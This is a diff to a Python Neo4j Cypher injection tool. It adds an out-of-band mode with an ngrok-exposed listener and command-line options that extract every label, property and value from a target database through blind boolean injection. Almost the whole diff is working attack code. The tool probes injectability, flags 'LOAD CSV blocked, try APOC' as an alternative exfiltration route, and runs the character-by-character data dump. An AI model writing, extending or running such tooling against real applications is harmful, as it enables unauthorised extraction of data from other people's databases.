@@ -201,7 +201,8 @@ class Neo4jInjector:
         self.cookie = cookie if cookie else ""
         self.blind_string = blind_string
         self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
-        self.proxies = {'http': 'http://127.0.0.1:8080'}
+        self.proxies = {}
+        #self.proxies = {'http': 'http://127.0.0.1:8080'}
         self.base_case = None
         self.working_char = ""
 
@@ -243,11 +244,11 @@ class Neo4jInjector:
         try:
             response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
             if response.status_code == 302:
-                print("302 Redirect, Cookies Expired/Invalid ?")
+                print(colored("302 Redirect, Cookies Expired/Invalid ?", "red"))
                 sys.exit()
             return response  # Return the response object
         except requests.exceptions.RequestException as e:
-            print(f"Error occurred: {e}")
+            print(colored(f"Error occurred: {e}", "red"))
         return None
 
     def check_true(self, result):
@@ -276,7 +277,7 @@ class Neo4jInjector:
         url, data = self.prepare_request_data(encoded_payload)
         self.base_case = self.execute_request(url, data)
         if (not self.base_case or self.base_case.status_code == 500):
-            if (input("Seems like something went wrong, continue? (y|N)").lower != "y"):
+            if (input(colored("Seems like something went wrong, continue? (y|N)", "red")).lower != "y"):
                 sys.exit()
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability", end='\r', flush=True)
@@ -331,7 +332,7 @@ class Neo4jInjector:
             nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
             convert_dict_to_table(nested_dict)
         else:
-            print("[!] Not vulnerable")
+            print(colored("[!] LOAD CSV blocked, try APOC", "red"))
             sys.exit()
 
         if edition == 'enterprise':
@@ -399,7 +400,7 @@ class Neo4jInjector:
         relationship_count = get_data()  
 
         if relationship_count is None or relationship_count == '0':
-            print("[!] The database might not have any relationships. Exiting...")
+            print(colored("[!] The database might not have any relationships. Exiting...", "red"))
             sys.exit()
 
         # dump relationships type
@@ -462,6 +463,9 @@ class Neo4jInjector:
         animation = "|/-\\"
         anim_index = 0
         for count_index in range(1000):
+            if count_index == 999:
+                print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
+                sys.exit()
             responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
             print(f"[{animation[anim_index % len(animation)]}] dumping label counts, might take awhile", end='\r', flush=True)
             anim_index += 1
@@ -571,7 +575,7 @@ class Neo4jInjector:
         anim_index = 0
         for label, size_dict in property_sizes_dict.items():
             print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{len(size_dict)}]")
+            print(f"[+] available properties [{len(size_dict)}]:")
             for count_index, size in size_dict.items():
                 pr0perty = ''
                 for size_index in range(size):
@@ -653,13 +657,13 @@ class Neo4jInjector:
         anim_index = 0
         for label, properties_dict in value_sizes_dict.items():
             print(f"\n[*] Label: {label}")
-            print(f"[+] available properties [{len(properties_dict)}]")
+            print(f"[+] available properties [{len(properties_dict)}]:")
 
             if label not in values_dict:
                 values_dict[label] = {}
 
             for pr0perty, size_dict in properties_dict.items():
-                print(f"[++] {pr0perty}")
+                print(f"[++] {pr0perty} [{len(size_dict)}]:")
 
                 if pr0perty not in values_dict[label]:
                     values_dict[label][pr0perty] = {}
@@ -699,20 +703,22 @@ class Neo4jInjector:
                 row = [properties[prop].get(i, '') for prop in property_names]
                 rows.append(row)
 
-            print(tabulate(rows, headers=[prop.capitalize() for prop in property_names], tablefmt="grid"))
+            print(tabulate(rows, headers=[prop for prop in property_names], tablefmt="grid"))
         return values_dict
 
-    def blind(self):
+
+    def blind_dump_all(self):
         label_count = self.find_label_count()
         label_sizes_dict = self.find_label_sizes(label_count)
         labels = self.dump_labels(label_sizes_dict)
+
         property_counts_dict = self.find_property_counts(labels)
         property_sizes_dict = self.find_property_sizes(property_counts_dict)
         properties_dict = self.dump_properties(property_sizes_dict)
+
         value_counts_dict = self.find_value_count(properties_dict)
         value_sizes_dict = self.find_value_size(value_counts_dict)
         values = self.dump_value(value_sizes_dict)
-
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
@@ -723,7 +729,27 @@ def main():
     parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
     parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
+
+
+    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode")
+    parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode")
+
+    parser.add_argument("--dump-all", action="store_true", help="Dumps all data")
+    parser.add_argument("--labels", action="store_true", help="Dump labels")
+    parser.add_argument("-L", "--label", help="Specify a label for property or value dumping")
+    parser.add_argument("--properties", action="store_true", help="Dump properties for a specified label (-L)")
+    parser.add_argument("-P", "--property", help="Specify properties to dump values (-L must also be used)")
+
     args = parser.parse_args()
+
+    if args.in_band and not args.blind_string:
+        parser.error("--in-band blind requires --blind-string.")
+
+    if args.properties and not args.label:
+        parser.error("--properties requires -L/--label.")
+
+    if args.property and not args.label:
+        parser.error("-P/--property requires -L/--label.")
 
     listener = Listener(args.listen_port)
     listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
@@ -734,7 +760,7 @@ def main():
         if ngrok_auth_token:
             ngrok.set_auth_token(ngrok_auth_token)
         else:
-            print("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.")
+            print(colored("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.", "red"))
             sys.exit(1)
         start_ngrok = ngrok.connect(args.listen_port, "tcp")
         url = start_ngrok.public_url.replace("tcp://", "http://")
@@ -759,9 +785,35 @@ def main():
         if still_inject != "y":
             return
 
-    # Begin exfiltration process
-    injector.blind()
-    # injector.exfil_data()
+    if args.dump_all:
+        injector.blind_dump_all()
+
+    if args.labels:
+        label_count = injector.find_label_count()
+        label_sizes_dict = injector.find_label_sizes(label_count)
+        labels = injector.dump_labels(label_sizes_dict)
+
+    if args.label and args.properties:
+        labels = args.label.split(',')
+        property_counts_dict = injector.find_property_counts(labels)
+        property_sizes_dict = injector.find_property_sizes(property_counts_dict)
+        properties_dict = injector.dump_properties(property_sizes_dict)
+
+    if args.label and args.property:
+        properties_dict = {}
+        labels = args.label.split(',')
+        properties = args.property.split(',')
+        for label in labels:
+            for pr0perty in properties:
+                if label in properties_dict:
+                    properties_dict[label].append(pr0perty)
+                else:
+                    properties_dict[label] = [pr0perty]
+        value_counts_dict = injector.find_value_count(properties_dict)
+        value_sizes_dict = injector.find_value_size(value_counts_dict)
+        values = injector.dump_value(value_sizes_dict)
+
+    #injector.exfil_data()
     # injector.exfil_relationship()
     # injector.clean_up()
 
